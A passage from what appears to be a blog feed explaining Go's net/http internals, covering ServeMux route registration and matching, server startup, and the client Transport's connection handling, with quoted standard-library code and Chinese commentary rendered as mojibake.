sync.WaitGroup&#125;<span class="hljs-comment">// Handler è·¯ç”±å¤„ç†å™¨çš„å®ç°</span><span class="hljs-keyword">type</span> ServeMux <span class="hljs-keyword">struct</span> &#123;   mu    sync.RWMutex   m     <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]muxEntry   es    []muxEntry <span class="hljs-comment">// slice of entries sorted from longest to shortest.</span>   hosts <span class="hljs-keyword">bool</span>       <span class="hljs-comment">// whether any patterns contain hostnames</span>&#125;<span class="hljs-keyword">type</span> muxEntry <span class="hljs-keyword">struct</span> &#123;   h       Handler    pattern <span class="hljs-keyword">string</span>&#125;</code></pre><h4 id="ServeMux"><a href="#ServeMux" class="headerlink" title="ServeMux"></a>ServeMux</h4><ul><li>m     map[string]muxEntryï¼šç»´æŠ¤pathå’Œhandlerçš„æ˜ å°„å…³ç³»</li><li>es    []muxEntry ç”¨äºè·¯ç”±å‰ç¼€åŒ¹é…</li><li>muxEntryï¼š åœ¨handlerå¤–ï¼Œå†—ä½™ä¿å­˜äº†pathè·¯å¾„ä¿¡æ¯</li></ul><h3 id="handlerå’Œè·¯ç”±æ³¨å†Œè¿‡ç¨‹"><a href="#handlerå’Œè·¯ç”±æ³¨å†Œè¿‡ç¨‹" class="headerlink" title="handlerå’Œè·¯ç”±æ³¨å†Œè¿‡ç¨‹"></a>handlerå’Œè·¯ç”±æ³¨å†Œè¿‡ç¨‹</h3><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><pre><code class="hljs golang">http.HandleFunc(<span class="hljs-string">"/ping"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;   _, _ = writer.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">"pong"</span>))&#125;)</code></pre><h4 id="HandleFunc"><a href="#HandleFunc" class="headerlink" title="HandleFunc"></a>HandleFunc</h4><p>è¡¥å……å†…éƒ¨å•ä¾‹å®ç°çš„ServeMux</p><pre><code class="hljs golang"><span class="hljs-comment">// DefaultServeMux is the default ServeMux used by Serve.</span><span class="hljs-keyword">var</span> DefaultServeMux = &amp;defaultServeMux <span class="hljs-comment">// å•ä¾‹</span><span class="hljs-keyword">var</span> defaultServeMux ServeMux<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleFunc</span><span class="hljs-params">(pattern <span class="hljs-keyword">string</span>, handler <span class="hljs-keyword">func</span>(ResponseWriter, *Request)</span>)</span> &#123;   DefaultServeMux.HandleFunc(pattern, handler)&#125;</code></pre><h4 id="ServeMux-HandleFunc"><a href="#ServeMux-HandleFunc" class="headerlink" title="ServeMux.HandleFunc"></a>ServeMux.HandleFunc</h4><p>å°†demoä¸­ä¼ å…¥çš„handleræ–¹æ³•ï¼ŒåŒ…è£…æˆHandlerFunc è¯¥ç±»å‹å®ç°äº†ä¸Šè¿°çš„ ServeHTTP(w ResponseWriter, r *Request) æ¥å£ï¼Œå®ç°é€»è¾‘æ˜¯å‡½æ•°è‡ªèº«çš„è°ƒç”¨</p><pre><code class="hljs golang"><span class="hljs-comment">// HandleFunc registers the handler function for the given pattern.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">HandleFunc</span><span class="hljs-params">(pattern <span class="hljs-keyword">string</span>, handler <span class="hljs-keyword">func</span>(ResponseWriter, *Request)</span>)</span> &#123;   <span class="hljs-keyword">if</span> handler == <span class="hljs-literal">nil</span> &#123;      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"http: nil handler"</span>)   &#125;   mux.Handle(pattern, HandlerFunc(handler))&#125;<span class="hljs-keyword">type</span> HandlerFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ResponseWriter, *Request)</span> // å®ç°<span class="hljs-title">Handler</span> è¯·æ±‚å¤„ç†æ¥å£</span><span class="hljs-comment">// ServeHTTP calls f(w, r).</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f HandlerFunc)</span> <span class="hljs-title">ServeHTTP</span><span class="hljs-params">(w ResponseWriter, r *Request)</span></span> &#123;   f(w, r) <span class="hljs-comment">// è°ƒç”¨handlerè‡ªèº«</span>&#125;</code></pre><h4 id="ServeMux-Handle"><a href="#ServeMux-Handle" class="headerlink" title="ServeMux.Handle"></a>ServeMux.Handle</h4><p>è·¯ç”±åŠæ–¹æ³•çš„æ³¨å†Œ<br>å¦‚æœæ³¨å†Œçš„è·¯å¾„patternæ˜¯ä»¥ /  ç»“å°¾ï¼Œåˆ™æ”¾å…¥esä¸­çš„åˆé€‚ä½ç½®ï¼Œç”¨äºè·¯å¾„å‰ç¼€åŒ¹é…</p><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">Handle</span><span class="hljs-params">(pattern <span class="hljs-keyword">string</span>, handler Handler)</span></span> &#123;   mux.mu.Lock()   <span class="hljs-keyword">defer</span> mux.mu.Unlock()   <span class="hljs-keyword">if</span> pattern == <span class="hljs-string">""</span> &#123;      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"http: invalid pattern"</span>)   &#125;   <span class="hljs-keyword">if</span> handler == <span class="hljs-literal">nil</span> &#123;      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"http: nil handler"</span>)   &#125;   <span class="hljs-keyword">if</span> _, exist := mux.m[pattern]; exist &#123;      <span class="hljs-built_in">panic</span>(<span class="hljs-string">"http: multiple registrations for "</span> + pattern)   &#125;   <span class="hljs-keyword">if</span> mux.m == <span class="hljs-literal">nil</span> &#123;      mux.m = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]muxEntry)   &#125;   e := muxEntry&#123;h: handler, pattern: pattern&#125;   mux.m[pattern] = e   <span class="hljs-keyword">if</span> pattern[<span class="hljs-built_in">len</span>(pattern)<span class="hljs-number">-1</span>] == <span class="hljs-string">'/'</span> &#123;      mux.es = appendSorted(mux.es, e)   &#125;   <span class="hljs-keyword">if</span> pattern[<span class="hljs-number">0</span>] != <span class="hljs-string">'/'</span> &#123;      mux.hosts = <span class="hljs-literal">true</span>   &#125;&#125;</code></pre><h3 id="æœåŠ¡å¯åŠ¨è¿‡ç¨‹"><a href="#æœåŠ¡å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="æœåŠ¡å¯åŠ¨è¿‡ç¨‹"></a>æœåŠ¡å¯åŠ¨è¿‡ç¨‹</h3><h4 id="ListenAndServe"><a href="#ListenAndServe" class="headerlink" title="ListenAndServe"></a>ListenAndServe</h4><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ListenAndServe</span><span class="hljs-params">(addr <span class="hljs-keyword">string</span>, handler Handler)</span> <span class="hljs-title">error</span></span> &#123;   server := &amp;Server&#123;Addr: addr, Handler: handler&#125;   <span class="hljs-keyword">return</span> server.ListenAndServe()&#125;</code></pre><h4 id="srv-Server-ListenAndServe"><a href="#srv-Server-ListenAndServe" class="headerlink" title="(srv *Server) ListenAndServe()"></a>(srv *Server) ListenAndServe()</h4><p>è°ƒç”¨netåŒ…ï¼Œç›‘å¬ç«¯å£</p><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(srv *Server)</span> <span class="hljs-title">ListenAndServe</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;   <span class="hljs-keyword">if</span> srv.shuttingDown() &#123;      <span class="hljs-keyword">return</span> ErrServerClosed   &#125;   addr := srv.Addr   <span class="hljs-keyword">if</span> addr == <span class="hljs-string">""</span> &#123;      addr = <span class="hljs-string">":http"</span>   &#125;   ln, err := net.Listen(<span class="hljs-string">"tcp"</span>, addr)   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;      <span class="hljs-keyword">return</span> err   &#125;   <span class="hljs-keyword">return</span> srv.Serve(ln)&#125;</code></pre><h4 id="srv-Server-Serve"><a href="#srv-Server-Serve" class="headerlink" title="(srv *Server) Serve"></a>(srv *Server) Serve</h4><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(srv *Server)</span> <span class="hljs-title">Serve</span><span class="hljs-params">(l net.Listener)</span> <span class="hljs-title">error</span></span> &#123;   <span class="hljs-comment">// ...</span>   ctx := context.WithValue(baseCtx, ServerContextKey, srv)   <span class="hljs-keyword">for</span> &#123;      rw, err := l.Accept() <span class="hljs-comment">// è°ƒç”¨tcp çš„acceptæ–¹æ³•</span>       <span class="hljs-comment">// ... </span>      c := srv.newConn(rw)    <span class="hljs-comment">// ... </span>      <span class="hljs-keyword">go</span> c.serve(connCtx)   &#125;&#125;</code></pre><ul><li>l.Accept()ï¼šåœ¨forå¾ªç¯ä¸­ï¼Œä¼šä½¿ç”¨netåŒ…çš„tcp acceptæ–¹æ³•ï¼ŒåŸç†æ˜¯epollå¤šè·¯å¤ç”¨æŠ€æœ¯Linux ï¼Œä¸ä¼šæŒç»­çš„è‡ªæ—‹å ç”¨cpuæ—¶é—´ç‰‡ï¼Œè€Œæ˜¯æœ‰è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ‰ç”±å†…æ ¸ç²¾å‡†å”¤é†’</li><li>newConn ï¼š å°è£…httpè¯·æ±‚</li><li>go c.serve(connCtx)ï¼š ä½¿ç”¨goroutineå¤„ç†è¯·æ±‚</li></ul><h4 id="c-conn-serve"><a href="#c-conn-serve" class="headerlink" title="(c *conn) serve"></a>(c *conn) serve</h4><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *conn)</span> <span class="hljs-title">serve</span><span class="hljs-params">(ctx context.Context)</span></span> &#123;<span class="hljs-comment">// ...</span>    serverHandler&#123;c.server&#125;.ServeHTTP(w, w.req) <span class="hljs-comment">// è°ƒç”¨ServeHTTPæ–¹æ³•</span><span class="hljs-comment">//...</span>&#125;sh serverHandler) ServeHTTP<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sh serverHandler)</span> <span class="hljs-title">ServeHTTP</span><span class="hljs-params">(rw ResponseWriter, req *Request)</span></span> &#123;   handler := sh.srv.Handler   <span class="hljs-keyword">if</span> handler == <span class="hljs-literal">nil</span> &#123;      handler = DefaultServeMux <span class="hljs-comment">// ä¸ä¼ ä¼šè¡¥å……å•ä¾‹çš„DefaultServeMux</span>   &#125;   <span class="hljs-keyword">if</span> req.RequestURI == <span class="hljs-string">"*"</span> &amp;&amp; req.Method == <span class="hljs-string">"OPTIONS"</span> &#123;      handler = globalOptionsHandler&#123;&#125;   &#125;   <span class="hljs-keyword">if</span> req.URL != <span class="hljs-literal">nil</span> &amp;&amp; strings.Contains(req.URL.RawQuery, <span class="hljs-string">";"</span>) &#123;      <span class="hljs-keyword">var</span> allowQuerySemicolonsInUse <span class="hljs-keyword">int32</span>      req = req.WithContext(context.WithValue(req.Context(), silenceSemWarnContextKey, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;         atomic.StoreInt32(&amp;allowQuerySemicolonsInUse, <span class="hljs-number">1</span>)      &#125;))      <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;         <span class="hljs-keyword">if</span> atomic.LoadInt32(&amp;allowQuerySemicolonsInUse) == <span class="hljs-number">0</span> &#123;            sh.srv.logf(<span class="hljs-string">"http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192"</span>)         &#125;      &#125;()   &#125;   handler.ServeHTTP(rw, req) <span class="hljs-comment">// handleræ˜¯ServeMuxï¼Œæ‰€ä»¥ä¼šèµ°åˆ°ServeMuxçš„å®ç°</span>&#125;</code></pre><h4 id="mux-ServeMux-ServeHTTP"><a href="#mux-ServeMux-ServeHTTP" class="headerlink" title="(mux *ServeMux) ServeHTTP"></a>(mux *ServeMux) ServeHTTP</h4><ul><li>æ‰¾åˆ°è·¯å¾„å¯¹åº”çš„hanlder</li><li>è°ƒç”¨è¯¥handler</li></ul><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">ServeHTTP</span><span class="hljs-params">(w ResponseWriter, r *Request)</span></span> &#123;   <span class="hljs-keyword">if</span> r.RequestURI == <span class="hljs-string">"*"</span> &#123;      <span class="hljs-keyword">if</span> r.ProtoAtLeast(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &#123;         w.Header().Set(<span class="hljs-string">"Connection"</span>, <span class="hljs-string">"close"</span>)      &#125;      w.WriteHeader(StatusBadRequest)      <span class="hljs-keyword">return</span>   &#125;   h, _ := mux.Handler(r) <span class="hljs-comment">// è¿™é‡ŒğŸ‘‡</span>   h.ServeHTTP(w, r)&#125;</code></pre><h4 id="mux-ServeMux-Handler"><a href="#mux-ServeMux-Handler" class="headerlink" title="(mux *ServeMux) Handler("></a>(mux *ServeMux) Handler(</h4><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">Handler</span><span class="hljs-params">(r *Request)</span> <span class="hljs-params">(h Handler, pattern <span class="hljs-keyword">string</span>)</span></span> &#123;   <span class="hljs-comment">// CONNECT requests are not canonicalized.</span>   <span class="hljs-keyword">if</span> r.Method == <span class="hljs-string">"CONNECT"</span> &#123;      <span class="hljs-comment">// If r.URL.Path is /tree and its handler is not registered,</span>      <span class="hljs-comment">// the /tree -&gt; /tree/ redirect applies to CONNECT requests</span>      <span class="hljs-comment">// but the path canonicalization does not.</span>      <span class="hljs-keyword">if</span> u, ok := mux.redirectToPathSlash(r.URL.Host, r.URL.Path, r.URL); ok &#123;         <span class="hljs-keyword">return</span> RedirectHandler(u.String(), StatusMovedPermanently), u.Path      &#125;      <span class="hljs-keyword">return</span> mux.handler(r.Host, r.URL.Path)   &#125;   <span class="hljs-comment">// All other requests have any port stripped and path cleaned</span>   <span class="hljs-comment">// before passing to mux.handler.</span>   host := stripHostPort(r.Host)   path := cleanPath(r.URL.Path)   <span class="hljs-comment">// If the given path is /tree and its handler is not registered,</span>   <span class="hljs-comment">// redirect for /tree/.</span>   <span class="hljs-keyword">if</span> u, ok := mux.redirectToPathSlash(host, path, r.URL); ok &#123;      <span class="hljs-keyword">return</span> RedirectHandler(u.String(), StatusMovedPermanently), u.Path   &#125;   <span class="hljs-keyword">if</span> path != r.URL.Path &#123;      _, pattern = mux.handler(host, path)      u := &amp;url.URL&#123;Path: path, RawQuery: r.URL.RawQuery&#125;      <span class="hljs-keyword">return</span> RedirectHandler(u.String(), StatusMovedPermanently), pattern   &#125;   <span class="hljs-keyword">return</span> mux.handler(host, r.URL.Path)&#125;</code></pre><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">handler</span><span class="hljs-params">(host, path <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(h Handler, pattern <span class="hljs-keyword">string</span>)</span></span> &#123;   mux.mu.RLock()   <span class="hljs-keyword">defer</span> mux.mu.RUnlock()   <span class="hljs-comment">// Host-specific pattern takes precedence over generic ones</span>   <span class="hljs-keyword">if</span> mux.hosts &#123;      h, pattern = mux.match(host + path) <span class="hljs-comment">// è¡¥å……å·¦æ–œæ </span>   &#125;   <span class="hljs-keyword">if</span> h == <span class="hljs-literal">nil</span> &#123;      h, pattern = mux.match(path)   &#125;   <span class="hljs-keyword">if</span> h == <span class="hljs-literal">nil</span> &#123;      h, pattern = NotFoundHandler(), <span class="hljs-string">""</span>   &#125;   <span class="hljs-keyword">return</span>&#125;</code></pre><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mux *ServeMux)</span> <span class="hljs-title">match</span><span class="hljs-params">(path <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(h Handler, pattern <span class="hljs-keyword">string</span>)</span></span> &#123;   <span class="hljs-comment">// Check for exact match first.</span>   v, ok := mux.m[path] <span class="hljs-comment">// ç²¾å‡†åŒ¹é…ï¼Œå‘½ä¸­å³è¿”å›å¯¹åº”çš„handler</span>   <span class="hljs-keyword">if</span> ok &#123;      <span class="hljs-keyword">return</span> v.h, v.pattern   &#125;   <span class="hljs-comment">// Check for longest valid match.  mux.es contains all patterns</span>   <span class="hljs-comment">// that end in / sorted from longest to shortest.</span>   <span class="hljs-comment">// æ¨¡ç³ŠåŒ¹é…ï¼Œesæ˜¯æŒ‰patternä»é•¿åˆ°çŸ­æ’åºï¼ŒåŒ¹é…ä¹Ÿæ˜¯ä»é•¿åˆ°çŸ­</span>   <span class="hljs-keyword">for</span> _, e := <span class="hljs-keyword">range</span> mux.es &#123;      <span class="hljs-keyword">if</span> strings.HasPrefix(path, e.pattern) &#123;         <span class="hljs-keyword">return</span> e.h, e.pattern <span class="hljs-comment">// å¦‚æœå‘½ä¸­patternçš„å‰ç¼€ï¼Œå°±è¿”å›å¯¹åº”handler</span>      &#125;   &#125;   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-string">""</span>&#125;</code></pre><p>è·¯ç”±åŒ¹é…æœºåˆ¶<br>æ‰€ä»¥å®é™…net/httpåŒ…å®ç°çš„è·¯ç”±åŒ¹é…æœºåˆ¶æ¯”è¾ƒç²—ç³™ï¼Œ</p><ol><li>ç²¾å‡†åŒ¹é…ï¼Œå‘½ä¸­mapä¸­çš„pattern å³è¿”å›å¯¹åº”çš„handler</li><li>æ¨¡ç³ŠåŒ¹é…ï¼Œåœ¨esåˆ—è¡¨ä¸­ï¼ˆæŒ‰patterné•¿åº¦ä»é•¿åˆ°çŸ­ï¼‰è¿›è¡Œå‰ç¼€æ¨¡ç³ŠåŒ¹é…ï¼Œå‘½ä¸­å³è¿”å›å¯¹åº”çš„handler</li></ol><h2 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h2><h3 id="æ•°æ®ç»“æ„-1"><a href="#æ•°æ®ç»“æ„-1" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><p>åŒæ ·æœ‰é»˜è®¤çš„å•ä¾‹å®ç°</p><pre><code class="hljs golang"><span class="hljs-keyword">type</span> Client <span class="hljs-keyword">struct</span> &#123;   Transport RoundTripper <span class="hljs-comment">// é€šä¿¡æ¨¡å—</span>   Jar CookieJar      CheckRedirect <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *Request, via []*Request)</span> <span class="hljs-title">error</span></span>      Timeout time.Duration&#125;</code></pre><h3 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h3><p>RoundTripper çš„å®ç°</p><pre><code class="hljs golang"><span class="hljs-keyword">type</span> Transport <span class="hljs-keyword">struct</span> &#123;   idleMu       sync.Mutex   closeIdle    <span class="hljs-keyword">bool</span>                                <span class="hljs-comment">// user has requested to close all idle conns</span>   <span class="hljs-comment">// æ”¾ç½®ç©ºé—²è¿æ¥çš„mapï¼Œç”¨äºå¤ç”¨ï¼ˆè¿æ¥åˆ°åŒä¸€æœåŠ¡ç«¯çš„ï¼‰</span>   idleConn     <span class="hljs-keyword">map</span>[connectMethodKey][]*persistConn <span class="hljs-comment">// most recently used at end</span>   idleConnWait <span class="hljs-keyword">map</span>[connectMethodKey]wantConnQueue  <span class="hljs-comment">// waiting getConns</span>   idleLRU      connLRU   reqMu       sync.Mutex   reqCanceler <span class="hljs-keyword">map</span>[cancelKey]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(error)</span></span>   altMu    sync.Mutex   <span class="hljs-comment">// guards changing altProto only</span>   altProto atomic.Value <span class="hljs-comment">// of nil or map[string]RoundTripper, key is URI scheme</span>   connsPerHostMu   sync.Mutex   connsPerHost     <span class="hljs-keyword">map</span>[connectMethodKey]<span class="hljs-keyword">int</span>   connsPerHostWait <span class="hljs-keyword">map</span>[connectMethodKey]wantConnQueue <span class="hljs-comment">// waiting getConns</span>   Proxy <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Request)</span> <span class="hljs-params">(*url.URL, error)</span></span>    <span class="hljs-comment">// æ–°è¿æ¥ç”Ÿæˆå™¨</span>   DialContext <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, network, addr <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(net.Conn, error)</span></span>   Dial <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(network, addr <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(net.Conn, error)</span></span>   DialTLSContext <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, network, addr <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(net.Conn, error)</span></span>   DialTLS <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(network, addr <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(net.Conn, error)</span></span>   TLSClientConfig *tls.Config   TLSHandshakeTimeout time.Duration   DisableKeepAlives <span class="hljs-keyword">bool</span>   DisableCompression <span class="hljs-keyword">bool</span>   MaxIdleConns <span class="hljs-keyword">int</span>   MaxIdleConnsPerHost <span class="hljs-keyword">int</span>   MaxConnsPerHost <span class="hljs-keyword">int</span>   IdleConnTimeout time.Duration   ResponseHeaderTimeout time.Duration   ExpectContinueTimeout time.Duration   TLSNextProto <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(authority <span class="hljs-keyword">string</span>, c *tls.Conn)</span> <span class="hljs-title">RoundTripper</span></span>   ProxyConnectHeader Header   GetProxyConnectHeader <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, proxyURL *url.URL, target <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(Header, error)</span></span>   MaxResponseHeaderBytes <span class="hljs-keyword">int64</span>   WriteBufferSize <span class="hljs-keyword">int</span>   <span class="hljs-comment">// ReadBufferSize specifies the size of the read buffer used</span>   <span class="hljs-comment">// when reading from the transport.</span>   <span class="hljs-comment">// If zero, a default (currently 4KB) is used.</span>   ReadBufferSize <span class="hljs-keyword">int</span>   <span class="hljs-comment">// nextProtoOnce guards initialization of TLSNextProto and</span>   <span class="hljs-comment">// h2transport (via onceSetNextProtoDefaults)</span>   nextProtoOnce      sync.Once   h2transport        h2Transport <span class="hljs-comment">// non-nil if http2 wired up</span>   tlsNextProtoWasNil <span class="hljs-keyword">bool</span>        <span class="hljs-comment">// whether TLSNextProto was nil when the Once fired</span>   <span class="hljs-comment">// ForceAttemptHTTP2 controls whether HTTP/2 is enabled when a non-zero</span>   <span class="hljs-comment">// Dial, DialTLS, or DialContext func or TLSClientConfig is provided.</span>   <span class="hljs-comment">// By default, use of any those fields conservatively disables HTTP/2.</span>   <span class="hljs-comment">// To use a custom dialer or TLS config and still attempt HTTP/2</span>   <span class="hljs-comment">// upgrades, set this to true.</span>   ForceAttemptHTTP2 <span class="hljs-keyword">bool</span>&#125;</code></pre><h3 id="å‘èµ·tcpè¿æ¥çš„æ­¥éª¤"><a href="#å‘èµ·tcpè¿æ¥çš„æ­¥éª¤" class="headerlink" title="å‘èµ·tcpè¿æ¥çš„æ­¥éª¤"></a>å‘èµ·tcpè¿æ¥çš„æ­¥éª¤</h3><ul><li>æ„é€ httpè¯·æ±‚å‚æ•°</li><li>è·å–tcpè¿æ¥</li><li>é€šè¿‡tcpè¿æ¥å‘é€æ•°æ®</li><li>é€šè¿‡tcpè¿æ¥æ¥å—æ•°æ®</li></ul><h4 id="t-Transport-roundTrip-req-Request-Response-error"><a href="#t-Transport-roundTrip-req-Request-Response-error" class="headerlink" title="(t Transport) roundTrip(req *Request)(Response, error)"></a>(t <em>Transport) roundTrip(req *Request)(</em>Response, error)</h4><pre><code class="hljs golang"><span class="hljs-comment">// roundTrip implements a RoundTripper over HTTP.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *Transport)</span> <span class="hljs-title">roundTrip</span><span class="hljs-params">(req *Request)</span> <span class="hljs-params">(*Response, error)</span></span> &#123;    <span class="hljs-comment">// ...</span>   <span class="hljs-keyword">for</span> &#123;     <span class="hljs-comment">// ... </span>      pconn, err := t.getConn(treq, cm) <span class="hljs-comment">// è·å–tcpè¿æ¥ï¼Œä¼šä»ç©ºé—²æ± ä¼˜å…ˆè·å–</span>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;         t.setReqCanceler(cancelKey, <span class="hljs-literal">nil</span>)         req.closeBody()         <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err      &#125;      <span class="hljs-keyword">var</span> resp *Response      <span class="hljs-keyword">if</span> pconn.alt != <span class="hljs-literal">nil</span> &#123;         <span class="hljs-comment">// HTTP/2 path.</span>         t.setReqCanceler(cancelKey, <span class="hljs-literal">nil</span>) <span class="hljs-comment">// not cancelable with CancelRequest</span>         resp, err = pconn.alt.RoundTrip(req)  <span class="hljs-comment">// tcpçš„è¿æ¥</span>      &#125; <span class="hljs-keyword">else</span> &#123;         resp, err = pconn.roundTrip(treq) <span class="hljs-comment">// tcpçš„è¿æ¥</span>      &#125;      <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;         resp.Request = origReq         <span class="hljs-keyword">return</span> resp, <span class="hljs-literal">nil</span>      &#125;        <span class="hljs-comment">// ... </span>   &#125;&#125;</code></pre><h4 id="æ„é€ è¿æ¥-t-Transport-dialConn-ctx-context-Context-cm-connectMethod-pconn-persistConn-err-error"><a href="#æ„é€ è¿æ¥-t-Transport-dialConn-ctx-context-Context-cm-connectMethod-pconn-persistConn-err-error" class="headerlink" title="æ„é€ è¿æ¥ (t *Transport) dialConn(ctx context.Context, cm connectMethod) (pconn *persistConn, err error)"></a>æ„é€ è¿æ¥ (t *Transport) dialConn(ctx context.Context, cm connectMethod) (pconn *persistConn, err error)</h4><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *Transport)</span> <span class="hljs-title">dialConn</span><span class="hljs-params">(ctx context.Context, cm connectMethod)</span> <span class="hljs-params">(pconn *persistConn, err error)</span></span> &#123;   pconn = &amp;persistConn&#123;      t:             t,      cacheKey:      cm.key(),      reqch:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> requestAndChan, <span class="hljs-number">1</span>), <span class="hljs-comment">// è¯»channel</span>      writech:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> writeRequest, <span class="hljs-number">1</span>), <span class="hljs-comment">// å†™channel</span>      closech:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),      writeErrCh:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> error, <span class="hljs-number">1</span>),      writeLoopDone: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),   &#125;   <span class="hljs-comment">// ...</span>   conn, err := t.dial(ctx, <span class="hljs-string">"tcp"</span>, cm.addr())    <span class="hljs-comment">// ...</span>   pconn.conn = conn    <span class="hljs-comment">// ...</span>   <span class="hljs-keyword">go</span> pconn.readLoop() <span class="hljs-comment">// å°†tcpè¿æ¥ä¸­è¯»å–çš„æ•°æ®æ”¾å…¥è¯»channel</span>   <span class="hljs-keyword">go</span> pconn.writeLoop()<span class="hljs-comment">// å°†éœ€è¦å†™å…¥çš„tcpè¿æ¥çš„æ•°æ®æ”¾å…¥å†™channel</span>   <span class="hljs-keyword">return</span> pconn, <span class="hljs-literal">nil</span>&#125;</code></pre><h4 id="ä¸‰ä¸ªloop-goroutine"><a href="#ä¸‰ä¸ªloop-goroutine" class="headerlink" title="ä¸‰ä¸ªloop goroutine"></a>ä¸‰ä¸ªloop goroutine</h4><ul><li>pconn.readLoop() ï¼šå°†tcpæœåŠ¡ç«¯çš„å“åº”æ”¾å…¥read channelä¸­ï¼šç”Ÿäº§è¯»channel</li><li>pconn.writeLoop()ï¼š å°†éœ€è¦å†™å…¥çš„tcpè¿æ¥çš„æ•°æ®æ”¾å…¥å†™channelï¼šæ¶ˆè´¹å†™channel</li><li>ä¸»goroutineï¼šå¤„ç†ç¨‹åºçš„è¯·æ±‚å’Œå“åº”åŠ¨ä½œï¼Œå¤„ç†å¦å¤–ä¸¤ä¸ªgoroutineçš„channelçš„æ•°æ®ï¼ˆæ¶ˆè´¹è¯»channelæ•°æ®ï¼Œ ç”Ÿäº§å†™channelæ•°æ®ï¼‰<br>é€šè¿‡channelï¼Œå®ç°ä¸‰ä¸ªgoroutineçš„é€šä¿¡ï¼Œ è§£è€¦å•ä¸ªè¿æ¥é€šé“çš„é˜»å¡ï¼Œé¿å…æ¯ä¸ªè¯·æ±‚éƒ½è¦é˜»å¡ç­‰å¾…æœåŠ¡ç«¯å“åº”ï¼Œä½¿è¯»å†™äº’ä¸å¹²æ‰°</li></ul>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>drpcçš„ä»£ç ç”Ÿæˆå·¥å…·çš„ç®€å•æ”¹é€ </title>
